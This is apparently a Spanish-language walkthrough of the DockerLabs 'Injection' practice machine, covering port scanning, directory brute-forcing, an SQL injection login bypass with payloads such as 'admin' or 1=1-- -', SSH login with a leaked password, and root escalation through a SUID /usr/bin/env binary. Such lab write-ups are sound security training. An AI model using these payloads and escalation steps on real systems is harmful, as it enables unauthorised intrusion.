- Tags: #InjectionDockerLabs
---
[Maquina Injection](https://mega.nz/file/rZlAERjY#152uP-zS7pTC0hbPaZB7aO6_puij633u4pW-jpMuctk) ==> Enlace de descarga a esta maquina que estaremos auditando. Descargamos el comprimido y una ves descargado procdemos a descomprimir.
```bash
7z x injection.zip
```
---
- Ya descomprimido desplegamos el contenedor.
```bash
sudo bash auto_deploy.sh injection.tar
```
---
- Esta es la direccion ip del **target**:
```bash
Máquina desplegada, su dirección IP es --> 172.17.0.2
```
---

- #### Fase Reconocimiento:
- Procedemos a detectar ante que nos estamos enfrentando con las siguientes herramientas:
```bash
ping -c 1 172.17.02 # Tenemos un ttl 64

wichSystem.py 172.17.0.2 # Nuestra utilidad nos reporta que estamos ante una maquina linux

172.17.0.2 (ttl -> 64): Linux
```
---
- #### Fase Escaneo Puertos:
- Procedemos a realizar escaneo para detectar los puertos expuestos del **target**, Usaremos nuestra herramienta ( `extractPorts` ) para parsear la informacion mas importante.
```bash
 nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

 extractPorts allPorts
```
---
- Una ves optenido la informacion mas importante procedemos a relalizar un escaneo exhaustivo de los puertos expuestos de la maquina:
```bash
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted 
```
---
- **( 22/tcp open  ssh     OpenSSH 8.9p1 )** ==> Tenemos un servicio ssh desactualizada, La version mas reciente es: **( ssh 10.0 )**, 
```bash
searchsploit ssh user enumeration # No encontramos un exploit de enumeracon para esta version
```
---
- **( 80/tcp open  http    Apache httpd 2.4.52 )** ==> Tenemos un servico de **apache2** Donde la version mas reciente es: **( 2.4.63 )**
- **( Apache httpd 2.4.52 )** ==> Gracias al **codeName** podemos ver en **LauncPad** que estamos ante una posible version de: **( ubuntuJammy )**
```bash
nmap --script http-enum -p80 172.17.0.2 -oN webScan # Nmap no encontro nada
```
---
- **( PHPSESSID:  httponly flag not set )** ==> Tenemos esta posible falla de seguridad
- **Nota** ==> El parámetro **`PHPSESSID`** es una cookie utilizada por PHP para gestionar sesiones de usuario. Su presencia en sí misma no es un problema de seguridad, pero su configuración puede indicar riesgos si no se implementan buenas prácticas. En tu caso, el escaneo muestra que la cookie no tiene el atributo **`HttpOnly`**, lo que puede ser una vulnerabilidad en ciertos contextos. 
- **`HttpOnly`**:  Es un atributo de seguridad que restringe el acceso a la cookie desde JavaScript, mitigando ataques de **Cross-Site Scripting (XSS)**. Si no está presente, un atacante podría robar la cookie mediante scripts maliciosos. La falta de `HttpOnly` en `PHPSESSID` no es un fallo crítico por sí sola, pero es un indicador de que la seguridad de las cookies no está optimizada

- #### Fase Reconocimiento Web:
- **( http://172.17.0.2/ )** ==> Si accedemos al recurso tendremos un panel de inicio de sesion.
- Usamos la herramineta: ( `whatweb ` ), y tambien: ( `wappalyzer` ) no nos reporta mucha informacion relevante
```bash
 whatweb 172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Iniciar Sesión]
```
- Procedemos a realizar un reconocimineto de rutas y subdominios bajo este direccon ip:
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash # Solo descubrimos dos rutas con codigo de estado 403

gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,js,html.back,php.back # Descubrimos archivos potenciales pero aun no podemos ver nada critico

/.html.back           (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2921]
/config.php           (Status: 200) [Size: 0]
```
---
- Asi mismo realizamos la peticion al **backup** por terminal pero no podemos acceder
```bash
curl -s -X GET "http://172.17.0.2/.html.back/"; echo
```
---
- #### Fase Prueba Login:
- **( SQL Injection )** Procedemos a auditar el panel de inicio de session, Logrando romper la consulta sql ya que al poner en el panel:
```bash
username: admin'
password: admin'

SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'root;'' at line 1
```
---
- Accedimos al panel de session con la siguiete SQLInjection y cualquier contrasena:
```bash
adminfdfasfdf' union select 1,2-- -
admin' or 1=1-- -
```
---
- Dentro de la session del usuario, Tenemos acceso al la cuenta del usuario: **( Dylan )** en el panel de administracion nos muestra una posible **password** de usuario, Sabemos que el servicio **ssh** esta expuesto por lo cual intentamos conectarnos atraves de ssh
```bash
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```
---
- Iniciamos la conexion por **ssh**
```bash
ssh dylan@172.17.0.2
```
---
- Proporcionamos la **password** filtrada de la web, Logrando el acceso al **target**
```bash
hostname -I ==>172.17.0.2 

whoami ==> dylan
```
---
- #### Escalada Privilegios:
- **( /var/www/html )** ==> En esta ruta encontramos archivos criticos y credenciales de inicio de sesion de la base de datos en: **( config.php )**
- **( SUID )** ==> Realizamos una busqueda por permisos **SUID** para poder obtener un vector de una posible escalada de privilegios:
```bash
find / -perm -4000 2>/dev/null
```
---
- Detectamos este binario con permisos elevados.
```bash
-rwsr-xr-x 1 root root        43976 Jan  8  2024 /usr/bin/env
```
---
- [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) ==> Ahora tenemos una via potencial de elevar privilegios, Buscamos en esta web sobre este binario, Nos proporcionan un vector de ataque para elevar nuestro privilegio.
```bash
/usr/bin/env bash -p
```
---
- Ahora tendremos una **bash** privilegiada como **root**
```bash
whoami ==> root
```
---